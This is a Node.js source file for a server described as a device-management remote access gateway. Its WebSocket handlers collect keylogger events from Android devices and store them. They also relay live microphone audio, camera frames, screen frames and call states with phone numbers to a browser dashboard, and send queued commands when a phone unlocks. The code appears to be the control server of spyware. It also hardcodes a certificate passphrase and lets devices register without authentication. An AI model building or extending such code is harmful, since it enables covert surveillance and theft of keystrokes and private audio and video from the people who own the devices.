/**
 * Remote Access Server Gateway
 * Express + WebSocket Server for device management
 */

import express from 'express';
import { WebSocketServer } from 'ws';
import http from 'http';
import https from 'https';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import crypto from 'crypto';
import config from './config.js';
import adminRoutes from './routes/admin.js';
import { socketRegistry } from './services/socketRegistry.js';
import { commandDispatcher } from './services/commandDispatcher.js';
import HealthMonitor from './services/healthMonitor.js';
import { authMiddleware, createToken, verifyToken } from './middleware/auth.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Initialize Express app
const app = express();
const server = http.createServer(app);

// HTTPS server (self-signed cert for Speech Recognition API)
let httpsServer = null;
try {
    const certsDir = path.join(__dirname, '../certs');
    const pfxPath = path.join(certsDir, 'cert.pfx');
    const keyPath = path.join(certsDir, 'key.pem');
    const certPath = path.join(certsDir, 'cert.pem');

    let sslOptions = null;

    if (fs.existsSync(pfxPath)) {
        sslOptions = {
            pfx: fs.readFileSync(pfxPath),
            passphrase: 'temp123',
        };
        console.log('[HTTPS] SSL certificate loaded from certs/cert.pfx');
    } else if (fs.existsSync(keyPath) && fs.existsSync(certPath)) {
        sslOptions = {
            key: fs.readFileSync(keyPath),
            cert: fs.readFileSync(certPath),
        };
        console.log('[HTTPS] SSL certificates loaded from certs/');
    }

    if (sslOptions) {
        httpsServer = https.createServer(sslOptions, app);
    } else {
        console.log('[HTTPS] No SSL certs found in certs/ — mic Speech Recognition requires HTTPS');
    }
} catch (e) {
    console.error('[HTTPS] Error loading certs:', e.message);
}

// Middleware
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// ─── CORS (restricted to allowed origins) ───
const ALLOWED_ORIGINS = [
    'https://remoteaccessapp.onrender.com',
    'https://remoteaccessapp-backup.onrender.com',
    'http://localhost:3000',
    'http://localhost:3443',
    'http://127.0.0.1:3000',
];

app.use((req, res, next) => {
    const origin = req.headers.origin;
    if (origin && ALLOWED_ORIGINS.includes(origin)) {
        res.header('Access-Control-Allow-Origin', origin);
    } else if (!origin) {
        // Same-origin requests (no Origin header) — allow (dashboard pages)
        res.header('Access-Control-Allow-Origin', '*');
    }
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.header('Access-Control-Allow-Credentials', 'true');
    if (req.method === 'OPTIONS') {
        return res.sendStatus(200);
    }
    next();
});

// ─── Security Headers ───
app.use((req, res, next) => {
    res.header('X-Content-Type-Options', 'nosniff');
    res.header('X-Frame-Options', 'DENY');
    res.header('X-XSS-Protection', '1; mode=block');
    res.header('Referrer-Policy', 'strict-origin-when-cross-origin');
    if (config.isProduction) {
        res.header('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
    }
    next();
});

// ─── Rate Limiting (login brute-force protection) ───
const loginAttempts = new Map();
function loginRateLimit(req, res, next) {
    const ip = req.ip || req.socket.remoteAddress;
    const now = Date.now();
    let attempts = loginAttempts.get(ip) || [];
    // Keep only attempts in last 60 seconds
    attempts = attempts.filter(t => now - t < 60_000);
    if (attempts.length >= 5) {
        return res.status(429).json({
            success: false,
            error: 'Too many login attempts. Try again in 60 seconds.',
        });
    }
    attempts.push(now);
    loginAttempts.set(ip, attempts);
    next();
}
// Cleanup stale entries every 5 minutes
setInterval(() => {
    const now = Date.now();
    for (const [ip, attempts] of loginAttempts) {
        const recent = attempts.filter(t => now - t < 60_000);
        if (recent.length === 0) loginAttempts.delete(ip);
        else loginAttempts.set(ip, recent);
    }
}, 5 * 60 * 1000);

// ─── Authentication Routes (public, no middleware) ───

// Login endpoint (rate-limited)
app.post('/auth/login', loginRateLimit, (req, res) => {
    const { username, password } = req.body;

    if (!username || !password) {
        return res.status(400).json({
            success: false,
            error: 'Username and password are required',
        });
    }

    if (username === config.auth.username && password === config.auth.password) {
        const token = createToken(username);

        res.cookie('auth_token', token, {
            httpOnly: true,
            secure: config.isProduction,
            sameSite: 'strict',
            maxAge: config.auth.tokenExpiry,
            path: '/',
        });

        return res.json({
            success: true,
            message: 'Authentication successful',
        });
    }

    return res.status(401).json({
        success: false,
        error: 'Invalid username or password',
    });
});

// Logout endpoint
app.get('/auth/logout', (req, res) => {
    res.clearCookie('auth_token', { path: '/' });
    res.redirect('/login.html');
});

// Session check endpoint
app.get('/auth/check', (req, res) => {
    const cookies = {};
    const header = req.headers.cookie;
    if (header) {
        header.split(';').forEach(c => {
            const [name, ...rest] = c.trim().split('=');
            cookies[name] = decodeURIComponent(rest.join('='));
        });
    }

    const result = verifyToken(cookies.auth_token);

    if (result.valid) {
        return res.json({ success: true, username: result.username });
    }
    return res.status(401).json({ success: false, error: 'Not authenticated' });
});

// ─── Auth Middleware (protects everything below) ───
app.use(authMiddleware);

// Serve static admin dashboard (protected) - no cache for HTML files
app.use((req, res, next) => {
    if (req.path.endsWith('.html') || req.path === '/') {
        res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
        res.setHeader('Pragma', 'no-cache');
        res.setHeader('Expires', '0');
    }
    next();
});
app.use(express.static(path.join(__dirname, '../public')));

// API routes (protected)
app.use('/api', adminRoutes);

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({
        status: 'ok',
        uptime: process.uptime(),
        devices: socketRegistry.getDeviceCount(),
    });
});

// Initialize WebSocket Server on HTTP
const wss = new WebSocketServer({
    server,
    path: '/',
});

// Also attach WebSocket to HTTPS if available
let wssHttps = null;
if (httpsServer) {
    wssHttps = new WebSocketServer({
        server: httpsServer,
        path: '/',
    });
}

console.log('[WebSocket] Server initialized');

/**
 * Safe send — prevents crash if socket is null or closed
 */
function safeSend(ws, data) {
    try {
        if (ws && ws.readyState === ws.OPEN) {
            ws.send(typeof data === 'string' ? data : JSON.stringify(data));
            return true;
        }
    } catch (e) {
        console.error(`[WebSocket] safeSend failed: ${e.message}`);
    }
    return false;
}

/**
 * Broadcast a message to all WebSocket clients (HTTP + HTTPS) except sender
 */
function broadcastToClients(senderWs, msg) {
    const message = typeof msg === 'string' ? msg : JSON.stringify(msg);
    const broadcast = (server) => {
        if (!server) return;
        server.clients.forEach(client => {
            if (client !== senderWs && client.readyState === client.OPEN) {
                client.send(message);
            }
        });
    };
    broadcast(wss);
    broadcast(wssHttps);
}

/**
 * WebSocket connection handler — shared between HTTP and HTTPS servers
 */
function handleWebSocketConnection(ws, req) {
    console.log('[WebSocket] New connection from:', req.socket.remoteAddress);

    let deviceId = null;
    let heartbeatInterval = null;

    // Handle messages
    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message.toString());


            // Normalize message structure (Android sends 'action', Frontend expects 'type')
            if (data.action && !data.type) {
                data.type = data.action;
            }

            // Inject deviceId if missing (for frontend)
            if (!data.deviceId && deviceId) {
                data.deviceId = deviceId;
            }

            // Handle browser identification
            if (data.type === 'identify') {
                return;
            }

            // Handle device registration (with HMAC authentication)
            if (data.type === 'register') {
                const incomingDeviceId = data.deviceId;

                // ─── HMAC Device Authentication ───
                const authToken = data.authToken;
                const authTimestamp = data.authTimestamp;

                if (authToken && authTimestamp) {
                    // Verify HMAC-SHA256 signature
                    const payload = `${incomingDeviceId}:${authTimestamp}`;
                    const expectedHmac = crypto
                        .createHmac('sha256', config.websocket.deviceSecret)
                        .update(payload)
                        .digest('hex');

                    // Timing-safe comparison to prevent timing attacks
                    const tokenBuf = Buffer.from(authToken, 'utf8');
                    const expectedBuf = Buffer.from(expectedHmac, 'utf8');

                    if (tokenBuf.length !== expectedBuf.length ||
                        !crypto.timingSafeEqual(tokenBuf, expectedBuf)) {
                        console.warn(`[WebSocket] ❌ HMAC verification FAILED for deviceId: ${incomingDeviceId}`);
                        safeSend(ws, {
                            type: 'auth_failed',
                            error: 'Invalid device authentication token',
                        });
                        ws.close(4001, 'Authentication failed');
                        return;
                    }

                    // Reject stale tokens (older than 5 minutes)
                    const tokenAge = Date.now() - parseInt(authTimestamp);
                    if (tokenAge > 5 * 60 * 1000) {
                        console.warn(`[WebSocket] ❌ Stale auth token for deviceId: ${incomingDeviceId} (${tokenAge}ms old)`);
                        safeSend(ws, {
                            type: 'auth_failed',
                            error: 'Authentication token expired',
                        });
                        ws.close(4002, 'Token expired');
                        return;
                    }

                    console.log(`[WebSocket] ✅ HMAC verified for deviceId: ${incomingDeviceId}`);
                } else {
                    // Graceful fallback during migration — log warning but allow
                    console.warn(`[WebSocket] ⚠️ Device ${incomingDeviceId} registered WITHOUT auth token (legacy client)`);
                }

                deviceId = incomingDeviceId;
                socketRegistry.register(deviceId, ws, data.metadata || {});

                // Send welcome message
                safeSend(ws, {
                    type: 'registered',
                    deviceId,
                    message: 'Successfully registered',
                });

                // Start heartbeat monitoring
                heartbeatInterval = setInterval(() => {
                    if (!safeSend(ws, { type: 'ping' })) {
                        clearInterval(heartbeatInterval);
                        console.log(`[WebSocket] Ping failed for ${deviceId}, clearing interval`);
                    }
                }, config.websocket.pingInterval);

                return;
            }

            // Handle heartbeat from device
            if (data.type === 'heartbeat') {
                if (deviceId) {
                    socketRegistry.updateMetadata(deviceId, {
                        lastHeartbeat: new Date().toISOString(),
                    });
                    safeSend(ws, { type: 'heartbeat_ack' });
                }
                return;
            }

            // Handle heartbeat pong
            if (data.type === 'pong') {
                if (deviceId) {
                    socketRegistry.updateMetadata(deviceId, {
                        lastSeen: new Date().toISOString(),
                    });
                }
                return;
            }

            // Handle device state changes (sleep/online from screen on/off)
            if (data.type === 'device_state') {
                console.log(`[WebSocket] 📱 device_state from ${deviceId}: ${data.state}`);
                if (deviceId) {
                    if (data.state === 'sleep') {
                        socketRegistry.markSleep(deviceId);
                    } else if (data.state === 'online') {
                        socketRegistry.updateMetadata(deviceId, { status: 'online' });
                    }
                    // Broadcast state change to dashboard
                    broadcastToClients(ws, { type: 'device_state', deviceId, state: data.state });
                }
                return;
            }

            // Handle device unlock events (flush pending commands)
            if (data.type === 'device_unlocked') {
                console.log(`[WebSocket] 🔓 device_unlocked from ${deviceId}`);
                if (deviceId) {
                    commandDispatcher.flushScheduled(deviceId);
                }
                return;
            }

            // Handle device info updates
            if (data.type === 'device_info') {
                if (deviceId) {
                    socketRegistry.updateMetadata(deviceId, data.info);
                }
                return;
            }

            // Handle FCM token update (sent separately after registration)
            if (data.type === 'fcm_token') {
                if (deviceId && data.fcmToken) {
                    socketRegistry.updateMetadata(deviceId, { fcmToken: data.fcmToken });
                    console.log(`[WebSocket] 🔔 FCM token stored for ${deviceId}`);
                }
                return;
            }

            // Handle mic audio chunks - forward to all browsers
            if (data.type === 'mic_chunk' && deviceId) {
                broadcastToClients(ws, { ...data, deviceId });
                return;
            }

            // Handle browser audio chunks - forward to target device (walkie-talkie)
            if (data.type === 'browser_audio_chunk' && data.deviceId) {
                const targetDevice = socketRegistry.getDevice(data.deviceId);
                if (targetDevice && targetDevice.ws && targetDevice.ws.readyState === targetDevice.ws.OPEN) {
                    safeSend(targetDevice.ws, data);
                }
                return;
            }

            // Handle camera frames - forward to all browsers
            if (data.type === 'camera_frame' && deviceId) {
                broadcastToClients(ws, data);
                return;
            }

            // Handle screen frames - forward to all browsers (Remote Control)
            if (data.type === 'screen_frame' && deviceId) {
                broadcastToClients(ws, data);
                return;
            }

            // Handle clean disconnection request
            if (data.type === 'disconnect' && deviceId) {
                console.log(`[WebSocket] Device ${deviceId} requesting clean disconnect`);
                socketRegistry.deleteDevice(deviceId);
                safeSend(ws, { type: 'disconnect_ack' });
                return;
            }

            // Handle command responses
            if (data.replyTo) {
                commandDispatcher.handleResponse(data);
                return;
            }

            // Handle device-pushed status updates (call_state, mic_state, etc.)
            if (['call_state', 'mic_state', 'camera_state'].includes(data.type) && deviceId) {
                socketRegistry.updateMetadata(deviceId, { [data.type]: data.state || data });
                // Broadcast call_state to all browser clients for real-time dashboard alerts
                if (data.type === 'call_state') {
                    console.log(`[WebSocket] 📞 call_state PUSH from ${deviceId}: state=${data.state}, number=${data.number || 'unknown'}`);
                    broadcastToClients(ws, { ...data, deviceId });
                }
                return;
            }

            // Handle accessibility status — forward to all browsers for dashboard alerts
            if (data.type === 'accessibility_status' && deviceId) {
                broadcastToClients(ws, { ...data, deviceId });
                return;
            }

            // Handle video playback status — forward to all browsers for dashboard sync
            if (data.type === 'video_status' && deviceId) {
                broadcastToClients(ws, { ...data, deviceId });
                return;
            }

            // Handle UI change notifications — forward to browsers for live Smart UI updates
            if (data.type === 'ui_changed' && deviceId) {
                broadcastToClients(ws, { type: 'ui_changed', deviceId });
                return;
            }

            // Handle keylog data pushed from device
            if (data.type === 'keylog_data' && deviceId) {
                const events = data.events || [];
                if (events.length > 0) {
                    // Store in memory
                    if (!global.keylogCache) global.keylogCache = new Map();
                    let cached = global.keylogCache.get(deviceId);
                    if (!cached) {
                        cached = [];
                        global.keylogCache.set(deviceId, cached);
                    }
                    events.forEach(ev => {
                        cached.unshift({ ...ev, deviceId, receivedAt: new Date().toISOString() });
                    });
                    // Trim to 2000 max
                    if (cached.length > 2000) {
                        global.keylogCache.set(deviceId, cached.slice(0, 2000));
                    }

                    // Persist to DB (throttled — raw capture generates tons of events)
                    if (!global._keylogSaveTimer) {
                        global._keylogSaveTimer = setTimeout(() => {
                            import('./services/database.js').then(db => {
                                const toSave = global.keylogCache?.get(deviceId)?.slice(0, 200) || [];
                                if (toSave.length > 0) db.saveKeylogEvents(deviceId, toSave).catch(() => { });
                            }).catch(() => { });
                            global._keylogSaveTimer = null;
                        }, 30000); // Save at most every 30s
                    }

                    // Broadcast to browser clients for live feed
                    broadcastToClients(ws, { type: 'keylog_data', deviceId, events, count: events.length });
                }
                return;
            }


            console.log('[WebSocket] Unknown message type:', data);
        } catch (error) {
            console.error('[WebSocket] Error parsing message:', error);
        }
    });

    // Handle disconnection — mark device offline (keep in registry)
    ws.on('close', () => {
        console.log(`[WebSocket] Client disconnected: ${deviceId || 'unknown'}`);

        if (heartbeatInterval) {
            clearInterval(heartbeatInterval);
        }

        if (deviceId) {
            commandDispatcher.clearDeviceCommands(deviceId);
            socketRegistry.markOffline(deviceId);
            console.log(`[WebSocket] Device ${deviceId} marked offline`);
        }
    });

    // Handle errors — mark offline (keep in registry)
    ws.on('error', (error) => {
        console.error(`[WebSocket] Connection error for ${deviceId || 'unknown'}:`, error.message);
        if (heartbeatInterval) {
            clearInterval(heartbeatInterval);
        }
        if (deviceId) {
            commandDispatcher.clearDeviceCommands(deviceId);
            socketRegistry.markOffline(deviceId);
            console.log(`[WebSocket] Device ${deviceId} marked offline after error`);
        }
    });
}

// Wire up WebSocket handlers
wss.on('connection', handleWebSocketConnection);

// Initialize and start health monitor
const healthMonitor = new HealthMonitor(socketRegistry);
healthMonitor.start();

// Notify browsers instantly when scheduled commands change
commandDispatcher.onScheduleUpdate = (deviceId) => {
    const msg = JSON.stringify({ type: 'schedule_updated', deviceId });
    const broadcast = (server) => {
        if (!server) return;
        server.clients.forEach(client => {
            if (client.readyState === client.OPEN) {
                client.send(msg);
            }
        });
    };
    broadcast(wss);
    broadcast(wssHttps);
};

// Heartbeat to keep Render server alive (self-ping every 4 minutes)
if (config.isProduction) {
    setInterval(async () => {
        try {
            const res = await fetch(`http://localhost:${config.port}/health`);
            const data = await res.json();
            console.log(`[KeepAlive] Ping OK - ${data.devices} device(s) connected`);
        } catch (err) {
            console.log('[KeepAlive] Self-ping failed:', err.message);
        }
    }, 4 * 60 * 1000); // Every 4 minutes
}

// ─── Global Express Error Handler ───
// Catches unhandled errors in route handlers to prevent server crash
app.use((err, req, res, next) => {
    console.error(`[Server] Unhandled error on ${req.method} ${req.path}:`, err.message);
    res.status(500).json({
        success: false,
        error: config.isProduction ? 'Internal server error' : err.message,
    });
});

// 404 handler for unknown API routes
app.use('/api/*', (req, res) => {
    res.status(404).json({ success: false, error: 'API endpoint not found' });
});

// ─── Process-Level Error Handlers ───
process.on('unhandledRejection', (reason, promise) => {
    console.error('[Server] Unhandled Promise Rejection:', reason);
    // Don't crash — log and continue
});

process.on('uncaughtException', (err) => {
    console.error('[Server] Uncaught Exception:', err.message);
    console.error(err.stack);
    // In production, gracefully shut down; in dev, keep running
    if (config.isProduction) {
        console.error('[Server] Fatal error in production — shutting down in 5s');
        setTimeout(() => process.exit(1), 5000);
    }
});

// Start server
server.listen(config.port, async () => {
    // Load devices from Supabase before anything else
    await socketRegistry.loadFromDB();
    // Load command history from Supabase
    await commandDispatcher.loadHistoryFromDB();
    // Load scheduled queue: file (sync, already done in constructor) then DB (authoritative)
    await commandDispatcher.loadQueueFromDB();

    console.log('='.repeat(50));
    console.log(`🚀 Remote Access Server Running`);
    console.log('='.repeat(50));
    console.log(`📡 HTTP Server: http://localhost:${config.port}`);
    console.log(`🔌 WebSocket: ws://localhost:${config.port}`);
    console.log(`🌍 Environment: ${config.nodeEnv}`);
    console.log(`📊 Admin Dashboard: http://localhost:${config.port}`);
    if (httpsServer) {
        const httpsPort = parseInt(config.port) + 443; // e.g., 3000 → 3443
        httpsServer.listen(httpsPort, () => {
            console.log(`🔒 HTTPS Server: https://localhost:${httpsPort}`);
            console.log(`🎤 Mic/Speech: https://192.168.29.87:${httpsPort}/speak.html`);
        });

        // Set up WebSocket handlers for HTTPS server too
        if (wssHttps) {
            wssHttps.on('connection', (ws, req) => {
                handleWebSocketConnection(ws, req);
            });
        }
    }
    console.log('='.repeat(50));
});

// Graceful shutdown
process.on('SIGTERM', () => {
    console.log('[Server] SIGTERM received, shutting down gracefully...');
    server.close(() => {
        console.log('[Server] Server closed');
        process.exit(0);
    });
});

process.on('SIGINT', () => {
    console.log('\n[Server] SIGINT received, shutting down gracefully...');
    server.close(() => {
        console.log('[Server] Server closed');
        process.exit(0);
    });
});
